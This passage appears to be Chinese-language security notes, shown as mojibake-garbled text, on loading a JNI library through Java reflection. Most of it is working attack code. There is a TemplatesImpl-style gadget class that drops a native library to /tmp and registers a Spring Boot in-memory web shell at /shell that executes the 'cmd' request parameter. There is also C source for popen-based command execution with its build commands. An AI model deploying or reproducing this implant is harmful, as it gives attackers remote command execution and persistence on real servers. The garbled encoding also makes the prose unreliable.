`æ³¨æ„ï¼Œè¿™é‡ŒåŠ è½½çš„dllæ–‡ä»¶ï¼Œæ˜¯com.test.Commandçš„ï¼Œåˆ«çš„ç±»èƒ½ä¸èƒ½ç”¨å°±æ¯é¸¡äº†`

 ä¸Šé¢ä»£ç çš„ç›®çš„æ˜¯------>//è°ƒç”¨java.lang.ClassLoader$NativeLibraryç±»çš„loadæ–¹æ³•åŠ è½½åŠ¨æ€é“¾æ¥åº“

#### å°è¯•è‡ªå·±å†™

æœç„¶è¦æˆ‘è‡ªå·±å†™ç¬¬ä¸€æ­¥å°±ç»™æ‰¹äº†ï¼Œloadæ–¹æ³•è¿˜æ˜¯nativeçš„ï¼Ÿï¼Ÿï¼Ÿ

![image-20231121124806018](..\img\final\image-20231121124806018.png)

```java
å¤§æ¦‚æ„æ€å°±æ˜¯ ç»™åŠ è½½Command.classçš„ç±»åŠ è½½å™¨ï¼ŒnativeLibraries addElement  åŠ ä¸ŠNativeLibraryè¿™ä¸ªå¯¹è±¡
 ç„¶å NativeLibraryè¿™ä¸ªå¯¹è±¡åå°„è°ƒç”¨loadæ–¹æ³•ï¼Œload.invoke(nativeLibraryObj, LIB_PATH, false); è¿™ä¸ªfalseæ²¡æ‡‚
    ï¼ˆç»å¯¹æˆ–è€…ç›¸å¯¹è·¯å¾„sogaï¼‰
```

![image-20231121131248748](..\img\final\image-20231121131248748.png)

![image-20231121131305278](..\img\final\image-20231121131305278.png)

#### æ”¾ä¸Šspringbootå†…å­˜é©¬

```java
import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import org.springframework.web.context.WebApplicationContext;
import org.springframework.web.context.request.RequestContextHolder;
import org.springframework.web.servlet.mvc.method.RequestMappingInfo;
import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.io.RandomAccessFile;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.Base64;
import java.util.Vector;
public class EvilClass extends AbstractTranslet {
    public static native String execCmd(String cmd);
    private static final String EVIL_JNI_BASE64 = "";//ğŸ‘´å°±ä¸æ”¾åœ¨è¿™é‡Œäº†,å¤ªé•¿äº†,è‡ªå·±ç”Ÿæˆ
    private static final String LIB_PATH = "/tmp/libcmd.so";
    static {
        try{
            byte[] jniBytes = Base64.getDecoder().decode(EVIL_JNI_BASE64);
            RandomAccessFile randomAccessFile = new RandomAccessFile(LIB_PATH, "rw");
            randomAccessFile.write(jniBytes);
            randomAccessFile.close();
            //è°ƒç”¨java.lang.ClassLoader$NativeLibraryç±»çš„loadæ–¹æ³•åŠ è½½åŠ¨æ€é“¾æ¥åº“
            ClassLoader cmdLoader = EvilClass.class.getClassLoader();
            Class<?> classLoaderClazz = Class.forName("java.lang.ClassLoader");
            Class<?> nativeLibraryClazz = Class.forName("java.lang.ClassLoader$NativeLibrary");
            Method load = nativeLibraryClazz.getDeclaredMethod("load", String.class, boolean.class);
            load.setAccessible(true);
            Field field = classLoaderClazz.getDeclaredField("nativeLibraries");
            field.setAccessible(true);
            Vector<Object> libs = (Vector<Object>) field.get(cmdLoader);
            Constructor<?> nativeLibraryCons = nativeLibraryClazz.getDeclaredConstructor(Class.class, String.class, boolean.class);
            nativeLibraryCons.setAccessible(true);
            Object nativeLibraryObj = nativeLibraryCons.newInstance(EvilClass.class, LIB_PATH, false);
            libs.addElement(nativeLibraryObj);
            field.set(cmdLoader, libs);
            load.invoke(nativeLibraryObj, LIB_PATH, false);

            //å†™å…¥å†…å­˜é©¬
            WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);
            RequestMappingHandlerMapping mappingHandlerMapping = context.getBean(RequestMappingHandlerMapping.class);
            Field configField = mappingHandlerMapping.getClass().getDeclaredField("config");
            configField.setAccessible(true);
            RequestMappingInfo.BuilderConfiguration config =
                    (RequestMappingInfo.BuilderConfiguration) configField.get(mappingHandlerMapping);
            Method method2 = EvilClass.class.getMethod("shell", HttpServletRequest.class, HttpServletResponse.class);
            RequestMappingInfo info = RequestMappingInfo.paths("/shell")
                    .options(config)
                    .build();
            EvilClass springControllerMemShell = new EvilClass();
            mappingHandlerMapping.registerMapping(info, springControllerMemShell, method2);
        }catch (Exception e){
            e.printStackTrace();
        }
    }
    public void shell(HttpServletRequest request, HttpServletResponse response) throws IOException {

        String cmd = request.getParameter("cmd");
        if (cmd != null) {
            String execRes = EvilClass.execCmd(cmd);
            response.getWriter().write(execRes);
            response.getWriter().flush();
        }
    }
    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {
    }
    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
}
```

```java
é‚£è¿™ä¸å°±èƒ½å®Œæˆé€šæ€æŠ€å·§äº†å˜›ï¼Œä¸å¯¹ï¼Œè¿˜éœ€æœ‰å†™çš„æƒé™ä½†å†™åˆ°/tmpæ–‡ä»¶ä¸‹ä¸çŸ¥æƒé™è¦å¤šå¤§å‘¢ï¼Ÿï¼Ÿï¼Ÿ
```

### å‘½ä»¤æ‰§è¡Œjni

å•¥æ—¶å€™ç”¨ç›´æ¥ç…§æ¬å³å¯

```java
package com.test;

public class Command {
    public native String exec(String cmd);
}
```

com_test_Command.h

```java
/* DO NOT EDIT THIS FILE - it is machine generated */
#include <jni.h>
/* Header for class com_test_Command */

#ifndef _Included_com_test_Command
#define _Included_com_test_Command
#ifdef __cplusplus
extern "C" {
#endif

JNIEXPORT jstring JNICALL Java_com_test_Command_exec
  (JNIEnv *, jobject, jstring);

#ifdef __cplusplus
}
#endif
#endif
```

Command.c

```java
#include "com_test_Command.h"
#include <string.h>
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
#include <stdlib.h>

int execmd(const char *cmd, char *result)
{
    char buffer[1024*12];              //å®šä¹‰ç¼“å†²åŒº
    FILE *pipe = _popen(cmd, "r"); //æ‰“å¼€ç®¡é“ï¼Œå¹¶æ‰§è¡Œå‘½ä»¤
    if (!pipe)
        return 0; //è¿”å›0è¡¨ç¤ºè¿è¡Œå¤±è´¥

    while (!feof(pipe))
    {
        if (fgets(buffer, 128, pipe))
        { //å°†ç®¡é“è¾“å‡ºåˆ°resultä¸­
            strcat(result, buffer);
        }
    }
    _pclose(pipe); //å…³é—­ç®¡é“
    return 1;      //è¿”å›1è¡¨ç¤ºè¿è¡ŒæˆåŠŸ
}
JNIEXPORT jstring JNICALL Java_com_test_Command_exec(JNIEnv *env, jobject class_object, jstring jstr)
{

    const char *cstr = (*env)->GetStringUTFChars(env, jstr, NULL);
    char result[1024 * 12] = ""; //å®šä¹‰å­˜æ”¾ç»“æœçš„å­—ç¬¦ä¸²æ•°ç»„
    if (1 == execmd(cstr, result))
    {
       // printf(result);
    }

    char return_messge[100] = "";
    strcat(return_messge, result);
    jstring cmdresult = (*env)->NewStringUTF(env, return_messge);
    //system();

    return cmdresult;
}
```

```java
g++ -fPIC -I"$JAVA_HOME/include" -I"$JAVA_HOME/include/linux" -shared -o libcmd.so com_anbai_sec_cmd_CommandExecution.cpp   linux
   
gcc -I "D:\JAVA_JDK\include"  -I "D:\JAVA_JDK\include\win32" -shared -o cmd.dll .\Command.c  windows
```

